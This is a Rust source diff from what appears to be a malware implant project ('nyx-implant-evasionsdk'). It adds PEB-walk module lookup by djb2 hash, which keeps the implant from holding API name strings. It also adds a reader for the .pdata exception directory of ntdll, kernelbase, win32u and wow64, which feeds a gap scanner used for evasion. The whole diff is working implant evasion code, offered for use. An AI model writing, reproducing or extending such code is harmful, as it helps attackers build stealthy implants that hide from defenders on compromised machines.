@@ -457,6 +457,91 @@ unsafe fn export_addr_by_hash_pub(base: *mut u8, fn_hash: u32) -> Option<usize> 
     None
 }
 
+// ---- .pdata (exception directory) reader — feeds gap::enumerate_gaps ----
+//
+// The gap math lives ONLY in nyx-implant-evasionsdk::gap; the implant's job is
+// purely to read live .pdata bytes from a mapped module via the PEB walk and
+// hand them (as a byte slice + the module's SizeOfImage) to the pure core.
+// We do NOT re-parse RUNTIME_FUNCTION_ENTRY or recompute gaps here. See
+// docs/WINDOWS_DEV.md §4 (P2.1a-i).
+
+/// A recovered `.pdata` view over a live, mapped module: the raw exception-
+/// directory bytes (a sorted array of 12-byte RUNTIME_FUNCTION_ENTRY) + the
+/// module's SizeOfImage (the `[0, image_size)` range the table covers) + the
+/// module base (so the caller can turn gap RVAs into absolute addresses).
+#[derive(Clone, Copy)]
+pub struct PdataView {
+    /// Raw `.pdata` bytes — feed directly to `gap::RuntimeFunctionEntry::parse_table`.
+    pub bytes: &'static [u8],
+    /// SizeOfImage from the PE OptionalHeader — the `[0, image_size)` range.
+    pub image_size: u32,
+    /// Module base address (turn a gap RVA into an absolute address: `base + rva`).
+    pub base: *mut u8,
+}
+
+/// Read a loaded module's PE headers and return its exception directory
+/// (`.pdata`, data-directory index 3) as a `PdataView`. Returns `None` if the
+/// module isn't mapped or has no exception directory (some tiny DLLs omit it).
+///
+/// `base` is the module's mapped base (as recovered from the PEB loader list).
+/// This is Windows-only (reads live PE headers via the PEB). The math is
+/// deliberately NOT done here — only byte extraction — so the gap algorithm
+/// stays single-sourced in `gap.rs`.
+///
+/// # Safety
+/// `base` must point to a currently-mapped PE image (a module in the PEB
+/// loader list) and remain mapped for the lifetime of the returned slice.
+pub unsafe fn pdata_view(base: *mut u8) -> Option<PdataView> {
+    // DOS header → e_lfanew → NT headers → optional header.
+    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
+    let nt = base.add(e_lfanew);
+    // PE signature (4) + file header (20) → optional header.
+    let opt = nt.add(24);
+    let magic = *(opt as *const u16);
+    // DataDirectory offset: PE32 (96) vs PE32+ (112). Same convention as
+    // parse_module/export_addr_by_hash_pub above — runtime-resolved, never
+    // hardcoded per build.
+    let dd_off = if magic == 0x20B { 112 } else { 96 };
+    // Exception directory = data-directory index 3 (8 bytes each: RVA, size).
+    let pdata_rva = *(opt.add(dd_off + 3 * 8) as *const u32);
+    let pdata_size = *(opt.add(dd_off + 3 * 8 + 4) as *const u32);
+    if pdata_rva == 0 || pdata_size == 0 {
+        return None;
+    }
+    // SizeOfImage is OptionalHeader offset 56 in BOTH PE32 and PE32+ (the PE32
+    // BaseOfData+ImageBase == PE32+ ImageBase byte count, so offsets re-align).
+    let image_size = *(opt.add(56) as *const u32);
+    // Defensive bound: a malformed/corrupt PE could claim a .pdata larger than
+    // the whole image. Reject rather than slice past the mapped region.
+    if pdata_rva.saturating_add(pdata_size) > image_size {
+        return None;
+    }
+    // SAFETY: the .pdata section of a mapped module is committed readable
+    // memory for the process lifetime (the loader maps it). Caller guarantees
+    // `base` is a live module; we read a stable, loader-owned region.
+    let bytes = core::slice::from_raw_parts(
+        base.add(pdata_rva as usize),
+        pdata_size as usize,
+    );
+    Some(PdataView { bytes, image_size, base })
+}
+
+/// Locate a loaded module by name (ASCII, case-insensitive) via the PEB walk
+/// and return its base address, without allocating. Returns `None` if the
+/// module isn't in the loader list (e.g. `win32u.dll`/`wow64.dll` may be
+/// absent on some builds — callers treat that as "skip this DLL", not fatal).
+///
+/// Thin wrapper over the same PEB walk `LiveNtdll::locate` uses, just exposing
+/// the module base for an arbitrary name so the gap scanner can iterate
+/// ntdll / kernelbase / win32u / wow64.
+///
+/// # Safety
+/// PEB walk reads process-global loader state stable post-load.
+pub unsafe fn module_base_by_name(name: &[u8]) -> Option<*mut u8> {
+    let module = find_module_by_hash(djb2(name))?;
+    Some(module.base)
+}
+
 /// Well-known module/API hashes (pre-computed djb2) so the implant never holds
 /// the literal strings. Recompute with `djb2(b"...")` if these change.
 pub mod hashes {
